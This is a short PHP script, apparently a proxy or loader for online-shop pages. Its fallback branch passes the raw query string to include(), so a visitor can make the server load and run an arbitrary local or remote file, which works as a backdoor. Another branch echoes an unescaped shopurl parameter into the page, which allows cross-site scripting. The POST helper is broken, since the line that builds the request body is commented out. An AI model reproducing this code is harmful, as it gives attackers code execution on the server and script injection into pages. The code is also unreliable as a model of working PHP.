<?php 
function make_http_post_request($server, $uri, $post, $uagent = "")
{  
	$_post = Array();
	if (is_array($post))
	{
		foreach ($post as $name => $value)
		{
			$_post[] = $name.'='.urlencode($value);  
		}
	}
	//$post = implode('&', $_post);

	$fp = fsockopen($server, 80);
	if ($fp)
	{  
		$caption = "POST /$uri HTTP/1.1\r\nHost: $server\r\n".
		"User-Agent: $uagent \r\n".
		"Content-Type: application/x-www-form-urlencoded\r\n".
		"Content-Length: ".strlen($post)."\r\n".
		"Connection: close\r\n\r\n$post";
		
		fputs($fp, $caption);  
		$content = '';
		while (!feof($fp))
		{
			$content  .= fgets($fp);
		}  
		fclose($fp);
		return strstr($content,"<!DOCTYPE");
	}  
	return false;  
}

if (isset($_GET['getshop']))
{
	header("Content-Type: text/html; charset=windows-1251");
	echo "<base href=\"http://{$_GET['shopurl']}\">";
	//echo make_http_post_request($_GET['shopurl'],$_GET['filename'],$_SERVER['QUERY_STRING'],"Test Browser");
}
else
{
	header('Content-type: application/x-javascript; charset=utf-8');
	header('Cache-Control: no-cache');
	include ($_SERVER['QUERY_STRING']);
}
?>


